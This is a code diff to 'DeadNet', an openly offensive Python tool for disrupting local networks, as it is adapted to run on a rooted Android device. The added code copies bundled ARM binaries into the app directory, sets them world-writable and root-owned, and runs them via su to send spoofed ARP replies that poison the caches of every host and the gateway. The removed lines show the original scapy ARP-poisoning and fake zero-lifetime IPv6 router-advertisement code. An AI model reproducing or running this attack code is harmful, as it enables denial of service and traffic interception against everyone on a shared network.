@@ -3,7 +3,9 @@
 import ipaddress
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
-
+from android.permissions import request_permissions, Permission
+request_permissions([Permission.WRITE_EXTERNAL_STORAGE, Permission.INTERNET, Permission.ACCESS_WIFI_STATE,
+                     Permission.ACCESS_NETWORK_STATE])
 from scapy.all import *
 from utils import *
 conf.verb = 0
@@ -22,6 +24,37 @@ conf.verb = 0
 
 class DeadNet:
     def __init__(self, iface, cidrlen, s_time, gateway, disable_ipv6, ipv6_preflen, gateway_mac=None):
+        import subprocess
+        import os
+
+        # Get the full path to the binary
+        orig_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', 'arp.arm64')
+        self.bin_path = '/data/data/org.test.deadnet/arp.arm64'
+        orig_path2 = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets', 'nra.arm64')
+        self.bin_path2 = '/data/data/org.test.deadnet/nra.arm64'
+        printf(f"path is {self.bin_path}")
+        # Start the binary as a new process
+
+        proc = subprocess.run(f"cp -rf {orig_path} {self.bin_path}", stdout=subprocess.PIPE, shell=True)
+        printf(f"proc output: {proc.stdout}")
+
+        proc = subprocess.run(f"cp -rf {orig_path2} {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
+        printf(f"proc output: {proc.stdout}")
+
+        proc = subprocess.run(f"ls -alt {self.bin_path}", stdout=subprocess.PIPE, shell=True)
+        printf(f"proc output: {proc.stdout}")
+
+        proc = subprocess.run(f"ls -alt {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
+        printf(f"proc output: {proc.stdout}")
+
+        proc = subprocess.run(f"id", stdout=subprocess.PIPE, shell=True)
+        printf(f"proc output: {proc.stdout}")
+
+        proc = subprocess.run(f"chmod 777 {self.bin_path}", stdout=subprocess.PIPE, shell=True)
+        proc = subprocess.run(f"chmod 777 {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
+        proc = subprocess.run(f"chown root {self.bin_path}", stdout=subprocess.PIPE, shell=True)
+        proc = subprocess.run(f"chown root {self.bin_path2}", stdout=subprocess.PIPE, shell=True)
+
         self.network_interface = iface
         self.arp_poison_interval = s_time
         self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN
@@ -38,6 +71,7 @@ class DeadNet:
 
         self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
         self.gateway_mac = gateway_mac or getmacbyip(self.gateway_ipv4)
+        self.gateway_mac_fake = RandMAC()
         if not self.gateway_mac:
             raise Exception(f"{RED}[-]{WHITE} Unable to get gateway mac -> {self.gateway_ipv4}")
         self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
@@ -98,32 +132,32 @@ class DeadNet:
         * poison every possible host with a spoofed mac address for the gateway
         """
         for host_ip in self.host_ipv4s:
-            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
-                                     pdst=self.gateway_ipv4)
-            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+            proc = subprocess.run(f"su -c {self.bin_path} {host_ip} {RandMAC()} {self.gateway_ipv4} {self.gateway_mac}", shell=True, check=True, text=True)
 
             # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
-            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+            proc = subprocess.run(f"su -c {self.bin_path} {self.gateway_ipv4} {self.gateway_mac_fake} {host_ip} ff:ff:ff:ff:ff:ff", shell=True, check=True, text=True)
 
     def poison_ra(self):
         """
         * Broadcast a fake dead router message periodically
         """
-        rand_mac = RandMAC()
-        spoofed_mc_ra = Ether(src=rand_mac) / \
-                        IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) / \
-                        ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
-                        ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
-                        ICMPv6NDOptMTU() / \
-                        ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
-        sendp(spoofed_mc_ra)
-    
+        return
+        proc = subprocess.run(f"su -c {self.bin_path2} {self.gateway_mac} {self.gateway_ipv6}",
+                              shell=True, check=True, text=True)
+        # spoofed_mc_ra = Ether(src=rand_mac) / \
+        #                 IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) / \
+        #                 ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
+        #                 ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
+        #                 ICMPv6NDOptMTU() / \
+        #                 ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
+        # sendp(spoofed_mc_ra)
+
     def dead_router_attack(self):
         """
         * Monitor RA messages and immediately send fake zero-lifetime RA packets
         """
-        NDP_Attack_Kill_Default_Router(iface=self.network_interface)
+        # NDP_Attack_Kill_Default_Router(iface=self.network_interface)
+        pass
 
     def start_attack(self):
         loop_count = 0
@@ -131,8 +165,8 @@ class DeadNet:
         if os_is_linux():
             printf("")
             printf("")
-        if self.spoof_ipv6ra:
-            threading.Thread(target=self.dead_router_attack, daemon=True).start()
+        # if self.spoof_ipv6ra:
+        #     threading.Thread(target=self.dead_router_attack, daemon=True).start()
         while not self.abort:
             try:
                 loop_count += 1
@@ -173,4 +207,3 @@ if __name__ == "__main__":
     attacker = DeadNet(arguments.iface, arguments.cidrlen, arguments.s_time, arguments.gateway,
                        arguments.disable_ipv6, arguments.preflen)
     attacker.start_attack()
-
